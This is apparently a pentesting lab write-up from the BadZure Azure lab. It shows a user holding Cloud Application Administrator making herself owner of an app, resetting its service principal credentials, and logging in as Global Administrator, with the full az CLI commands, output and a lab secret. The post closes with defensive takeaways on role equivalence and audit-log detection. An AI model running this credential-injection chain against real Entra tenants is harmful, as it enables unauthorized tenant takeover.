---
title: "BadZure: Cloud Application Administrator vs Application Administrator"
date: 2026-05-14 00:01:00 +0000
categories: [Azure, Pentesting]
tags: [azure, entra-id, cloud-application-administrator, badzure, credential-injection]
---

## Overview

**Technique:** Cloud Application Administrator → App Ownership → Credential Injection  
**Initial Access:** leila.herrion (user)  
**Outcome:** Authenticated as OctaIntegrator SP → Global Administrator  
**Environment:** BadZure lab  

---

## Attack Chain

```
leila.herrion
        ↓
Cloud Application Administrator (direct role assignment)
        ↓
Add self as owner of OctaIntegrator
        ↓
az ad sp credential reset → authenticate as OctaIntegrator
        ↓
Global Administrator → Tenant Owned
```

---

## Step 1 - Enumeration

Authenticated as leila.herrion and checked direct directory role assignments:

```bash
PS C:\users\flare\desktop\azure> az rest --method GET --url 'https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?$filter=principalId%20eq%20%27e7c12c52-d589-4500-b16d-ea65695afe74%27'
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#roleManagement/directory/roleAssignments",
  "value": [
    {
      "directoryScopeId": "/",
      "id": "egSMFQfJVkW370RlUaa191IsweeJ1QBFsW3qZWla_nQ-1",
      "principalId": "e7c12c52-d589-4500-b16d-ea65695afe74",
      "roleDefinitionId": "158c047a-c907-4556-b7ef-446551a6b5f7"
    }
  ]
}
```

leila.herrion has **Cloud Application Administrator** (`158c047a-c907-4556-b7ef-446551a6b5f7`) directly assigned.

---

## Step 2 - Cloud App Admin vs Application Administrator

Cloud Application Administrator can manage all app registrations and enterprise apps **except Application Proxy**. The key capabilities relevant to this attack path are almost identical to Application Administrator:

- Add/remove app owners
- Reset SP credentials
- Manage app registrations

The distinction matters for defense  Cloud Application Administrator is sometimes granted instead of Application Administrator under the assumption it's lower risk. In practice for credential injection paths the two roles are equivalent.

---

## Step 3 - App Ownership and Credential Injection

Listed tenant apps and selected `OctaIntegrator` as target as instructed by BadZure:

```powershell
PS C:\users\flare\desktop\azure> az ad app list --query "[].{Name:displayName, AppID:appId, ObjectID:id}" --output table

Name                AppID                                 ObjectID
------------------  ------------------------------------  ------------------------------------
CorePipeline        46273cce-148c-417e-b7f5-23aedce0f14a  0bc0369b-c410-4e6e-bc36-ff506bb043a9
DeployMapper        c7c73caa-dd94-46f2-8d75-258a87fbcf53  0da102b4-5beb-4dd2-9e3f-5bce9c98bdd3
VisionTrackerFly    3c139c6e-45c5-49bb-bcd1-90649a8d4e46  0e25165c-1c6b-407c-87e4-d94144dfc85e
TetraSyncerGrid     c8eeec9b-4269-42fa-8d1f-fcf51a926cdf  1e7ff070-4253-4132-a911-26f35eabe4a5
OctaIntegrator      4fe7fb17-8a3b-4fc5-b7ac-75a42511892b  2c69861d-496c-4694-a013-f91ccbdaa3ee
TerraMoverPro       a16997f7-d83e-4584-81db-baf2dfa75790  2cbf94c5-08da-4d40-bcb6-f881dbe68c95
GlobeAnalyzer       b180b10d-4808-4612-ae0b-bcece4c8cfa2  3c71a273-15eb-4dd9-b464-af15061d357a
TetraSolverSpark    f34b604a-8a32-4e85-9479-b7a70b84c5f3  51de51be-3376-4ab3-815a-d0926f015fd4
GlobePipelineBeam   439f6a22-9497-48c1-b77b-439d209871af  71916a4f-332b-48ca-aff0-13793b5e9bf3
AppFlow             bcfedc2d-ad5e-4e1d-90d6-1747d39463ad  748f57b2-5b67-4a55-8656-226a0dfe50e6
MetaEngine          ada113a0-e58f-421a-a8d6-175913efa711  8512e1cc-b9ae-4d3c-98e1-e66513e9a87a
CoreAnalyzerGlobe   e9f53dfa-3eb8-4948-b596-20d8bf520c0c  a148fbd0-1c37-4e28-baeb-2f963f7e82b5
MetaMaster          b6108bf1-f550-435c-80e8-3af3c3fb72ea  a4ab00db-37e3-4f1b-ba8c-ff11a12bf0b7
VertexAgentPort     d9e0410b-c805-4ad9-9184-40d5557a6eba  b2e50d2d-e924-4ab4-82a6-a3ff7fdb1ba0
SoftGeneratorSpace  a8633bc4-d8ce-4d2f-8940-c364ff99d0f5  b5e532a6-38d9-44c4-9332-70537cf953a3
PS C:\users\flare\desktop\azure> az ad app  owner add --id4fe7fb17-8a3b-4fc5-b7ac-75a42511892b --owner-object-id e7c12c52-d589-4500-b16d-ea65695afe74
```

Reset credentials:

```powershell
az ad sp credential reset --id 4fe7fb17-8a3b-4fc5-b7ac-75a42511892b
```

Output:
```json
{
  "appId": "4fe7fb17-8a3b-4fc5-b7ac-75a42511892b",
  "password": "UPK8Q~k4qvY23DD_fUpT6Euu0OYtW-JRAAkSyc7g",
  "tenant": "97b..."
}
```

---

## Step 4 - Authenticate as OctaIntegrator

```bash
az login --service-principal \
  -u "4fe7fb17-8a3b-4fc5-b7ac-75a42511892b" \
  -p "UPK8Q~k4qvY23DD_fUpT6Euu0OYtW-JRAAkSyc7g" \
  --tenant "97b..."
```

Confirmed Global Administrator:

```bash
PS C:\users\flare\desktop\azure> az rest --method GET --url 'https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?$filter=principalId%20eq%20%272d9343e3-e968-4f53-be87-0d0a6eef0eb4%27'
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#roleManagement/directory/roleAssignments",
  "value": [
    {
      "directoryScopeId": "/",
      "id": "NEN4W0v5Gkejh-chn8ScouNDky1o6VNPvocNCm7vDrQ-1",
      "principalId": "2d9343e3-e968-4f53-be87-0d0a6eef0eb4",
      "roleDefinitionId": "5b784334-f94b-471a-a387-e7219fc49ca2"
    },
    {
      "directoryScopeId": "/",
      "id": "lAPpYvVpN0KRkAEhdxReEONDky1o6VNPvocNCm7vDrQ-1",
      "principalId": "2d9343e3-e968-4f53-be87-0d0a6eef0eb4",
      "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10"
    }
  ]
}
```

Role `62e90394` = Global Administrator confirmed. Tenant owned.

---

## Key Takeaways

**Cloud Application Administrator vs Application Administrator:**
For credential injection attack paths these roles are functionally equivalent. Both allow  resetting SP credentials. The only practical difference is Application Proxy management and the Application Administrator cannot make himself owner as in case of the Cloud Application Administrator. Defenders who grant Cloud Application Administrator as a "safer" alternative to Application Administrator are not reducing the attack surface for this class of attack.

**Detection and remediation** are identical to the app_admin_group_member path except for app owner additions, the credential resets in Entra audit logs are the primary detection surface.
